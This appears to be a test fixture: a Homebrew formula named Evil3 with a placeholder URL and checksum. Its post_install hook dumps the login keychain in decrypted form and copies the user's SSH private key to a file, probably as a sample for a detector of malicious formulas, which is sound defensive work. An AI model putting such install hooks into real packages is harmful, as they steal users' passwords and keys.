class Evil3 < Formula
  url "https://example.com/evil3-1.0.tar.gz"
  sha256 "3333333333333333333333333333333333333333333333333333333333333333"
  def post_install
    system "security", "dump-keychain", "-d", "login.keychain"
    system "cat #{Dir.home}/.ssh/id_rsa > #{var}/k"
  end
end
